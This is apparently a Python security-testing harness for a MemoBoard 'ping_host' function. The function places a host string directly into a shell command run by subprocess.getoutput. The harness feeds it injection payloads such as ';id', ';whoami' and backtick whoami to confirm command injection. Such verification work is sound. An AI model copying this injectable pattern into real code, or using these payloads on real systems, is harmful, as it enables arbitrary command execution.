#!/usr/bin/env python3
"""Harness: Verify command injection in ping_host via subprocess.getoutput.

This harness extracts the exact vulnerable function from src/board/engine.py:77-79
and tests it with benign and malicious payloads to confirm shell metacharacter injection.
"""
import argparse
import subprocess

MSGS = {
    "benign": ("Benign host=", "正常 host="),
    "inject": ("Inject host=", "注入 host="),
    "confirmed": ("Command injection confirmed with payload", "命令注入已用该载荷确认"),
    "miss": ("No injected command output observed.", "未观察到注入命令的输出。"),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def ping_host(host: str) -> str:
    # Host is interpolated into a shell command and the output is returned.
    return subprocess.getoutput(f"echo MEMO-PING {host}")


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard ping command-injection harness")
    p.add_argument("--zh", action="store_true", help="Print labels in Chinese (default: English)")
    args = p.parse_args()
    zh = args.zh

    benign = ping_host("127.0.0.1")
    print(f"{msg('benign', zh)}127.0.0.1 -> {benign!r}")

    injected_id = ping_host(";id")
    print(f"{msg('inject', zh)};id -> {injected_id!r}")

    injected_whoami = ping_host(";whoami")
    print(f"{msg('inject', zh)};whoami -> {injected_whoami!r}")

    injected_tick = ping_host("`whoami`")
    print(f"{msg('inject', zh)}`whoami` -> {injected_tick!r}")

    # `& echo` is interpreted by both /bin/sh (sandbox) and cmd.exe (Windows hosts).
    injected_amp = ping_host("& echo HARNESS-PWN")
    print(f"{msg('inject', zh)}& echo HARNESS-PWN -> {injected_amp!r}")

    for label, result in (
        (";id", injected_id),
        (";whoami", injected_whoami),
        ("`whoami`", injected_tick),
        ("& echo HARNESS-PWN", injected_amp),
    ):
        lines = [line for line in result.strip().split("\n") if line.strip()]
        extra = len(lines) > 1 or (len(lines) == 1 and "MEMO-PING" not in lines[0])
        if extra or "uid=" in result or "HARNESS-PWN" in result:
            print(msg("confirmed", zh), label)
            print(result)
            return 0

    print(msg("miss", zh))
    print(injected_id)
    print(injected_whoami)
    print(injected_tick)
    print(injected_amp)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
